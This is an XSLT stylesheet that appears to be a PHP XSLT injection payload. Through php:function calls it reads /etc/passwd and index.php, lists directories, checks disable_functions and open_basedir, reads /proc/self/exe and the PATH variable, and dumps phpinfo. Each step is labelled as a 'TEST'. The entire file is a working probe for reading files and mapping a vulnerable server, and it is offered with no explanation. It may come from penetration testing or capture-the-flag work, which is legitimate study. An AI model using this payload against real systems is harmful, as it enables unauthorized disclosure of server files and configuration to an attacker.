<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                xmlns:php="http://php.net/xsl" version="1.0">
    <xsl:template match="/">
        <xsl:text>=== TEST : getcwd ===&#10;</xsl:text>
        <xsl:value-of select="php:function('getcwd')" />
        <xsl:text>&#10;=== TEST : file_get_contents index.php ===&#10;</xsl:text>
        <xsl:value-of select="php:function('file_get_contents', 'index.php')" />
        <xsl:text>&#10;=== TEST : file_get_contents /etc/passwd ===&#10;</xsl:text>
        <xsl:value-of select="php:function('file_get_contents', '/etc/passwd')" />
        <xsl:text>&#10;=== TEST : scandir current directory ===&#10;</xsl:text>
        <xsl:for-each select="php:function('scandir', php:function('getcwd'))">
            <xsl:value-of select="." />
            <xsl:text>&#10;</xsl:text>
        </xsl:for-each>
        <xsl:text>&#10;=== TEST : scandir /etc ===&#10;</xsl:text>
        <xsl:for-each select="php:function('scandir', '/etc')">
            <xsl:value-of select="." />
            <xsl:text>&#10;</xsl:text>
        </xsl:for-each>
        <xsl:text>&#10;=== TEST : ini_get disable_functions ===&#10;</xsl:text>
        <xsl:value-of select="php:function('ini_get', 'disable_functions')" />
        <xsl:text>&#10;=== TEST : ini_get open_basedir ===&#10;</xsl:text>
        <xsl:value-of select="php:function('ini_get', 'open_basedir')" />
        <xsl:text>&#10;=== TEST : realpath /etc/passwd ===&#10;</xsl:text>
        <xsl:value-of select="php:function('realpath', '/etc/passwd')" />
        <xsl:text>&#10;=== TEST : tempnam ===&#10;</xsl:text>
        <xsl:value-of select="php:function('tempnam', php:function('sys_get_temp_dir'), 'test')" />
        <xsl:text>&#10;=== TEST : disk_free_space ===&#10;</xsl:text>
        <xsl:value-of select="php:function('disk_free_space', '/')" />
        <xsl:text>&#10;=== TEST : disk_total_space ===&#10;</xsl:text>
        <xsl:value-of select="php:function('disk_total_space', '/')" />
        <xsl:text>&#10;=== TEST : readlink /proc/self/exe ===&#10;</xsl:text>
        <xsl:value-of select="php:function('readlink', '/proc/self/exe')" />
        <xsl:text>&#10;=== TEST : getenv PATH ===&#10;</xsl:text>
        <xsl:value-of select="php:function('getenv', 'PATH')" />
        <xsl:text>&#10;=== TEST : phpinfo ===&#10;</xsl:text>
        <xsl:value-of select="php:function('phpinfo')" />
    </xsl:template>
</xsl:stylesheet>
